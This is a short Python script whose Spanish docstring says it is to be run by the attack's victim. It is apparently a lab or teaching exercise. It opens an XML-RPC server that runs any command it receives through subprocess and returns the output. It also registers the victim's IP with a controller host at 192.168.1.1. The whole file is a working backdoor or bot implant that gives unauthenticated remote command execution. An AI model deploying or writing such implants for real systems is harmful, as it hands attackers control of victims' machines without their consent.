'''
Este programa debe ser ejecutado por la víctima del ataque
'''
from xmlrpc.server import SimpleXMLRPCServer
import xmlrpc.client
import subprocess
from aux.get_host_ip import get_local_ip

def lanzar_comando(comando):
    result = subprocess.run(comando,capture_output=True)
    return result.stdout

host_registro='192.168.1.1'
port_registro=9001
host=str(get_local_ip())
port=9000
server = SimpleXMLRPCServer((host, port))
server.register_function(lanzar_comando, 'command')

client = xmlrpc.client.ServerProxy(f'http://{host_registro}:{port_registro}')
result=getattr(client, 'registrar')(str(host))

try:
    print('Use Control-C to exit')
    server.serve_forever()
except KeyboardInterrupt:
    print('Exiting')
